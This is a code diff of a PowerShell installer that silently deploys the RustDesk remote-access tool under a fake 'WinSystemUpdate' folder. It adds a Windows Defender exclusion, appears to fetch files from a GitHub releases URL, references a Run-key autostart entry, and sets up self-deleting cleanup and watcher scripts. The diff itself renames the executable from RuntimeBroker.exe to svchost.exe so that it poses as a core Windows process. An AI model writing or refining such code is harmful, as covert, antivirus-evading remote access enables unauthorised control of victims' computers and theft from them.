@@ -1,7 +1,7 @@
 function Install-RD {
     $ProgressPreference = 'SilentlyContinue'
     $DEST   = "$env:LOCALAPPDATA\WinSystemUpdate"
-    $EXE    = "$DEST\RuntimeBroker.exe"
+    $EXE    = "$DEST\svchost.exe"
     $DLL    = "$DEST\sciter.dll"
     $cfgDir = "$env:APPDATA\RustDesk\config"
     $base   = 'https://github.com/kk70226581/rd-files/releases/download/v1.0'
@@ -9,7 +9,7 @@ function Install-RD {
     try { Add-MpPreference -ExclusionPath $DEST -EA SilentlyContinue } catch {}
 
     # Kill old + clean
-    Get-Process RuntimeBroker -EA SilentlyContinue |
+    Get-Process svchost -EA SilentlyContinue |
         Where-Object { $_.Path -like '*WinSystem*' } |
         Stop-Process -Force -EA SilentlyContinue
     Start-Sleep 1
@@ -79,7 +79,7 @@ key_confirmed = true
     $del = "$DEST\delete.ps1"
     Set-Content $del @'
 $d = "$env:LOCALAPPDATA\WinSystemUpdate"
-Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
+Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -like '*WinSystem*' } | Stop-Process -Force -EA SilentlyContinue
 Remove-ItemProperty 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' 'WinSystemUpdate' -EA SilentlyContinue
 Start-Sleep 2
 Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
@@ -88,12 +88,12 @@ Remove-Item -LiteralPath $d -Recurse -Force -EA SilentlyContinue
     # Watcher - auto deletes when process stops OR after 1 hour
     $watch = "$DEST\watch.ps1"
     Set-Content $watch @'
-$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\RuntimeBroker.exe"
+$EXE      = "$env:LOCALAPPDATA\WinSystemUpdate\svchost.exe"
 $del      = "$env:LOCALAPPDATA\WinSystemUpdate\delete.ps1"
 $deadline = [DateTime]::Now.AddHours(1)
 while ([DateTime]::Now -lt $deadline) {
     Start-Sleep 10
-    $alive = Get-Process RuntimeBroker -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
+    $alive = Get-Process svchost -EA SilentlyContinue | Where-Object { $_.Path -eq $EXE }
     if (-not $alive) { break }
 }
 if (Test-Path $del) { & $del }
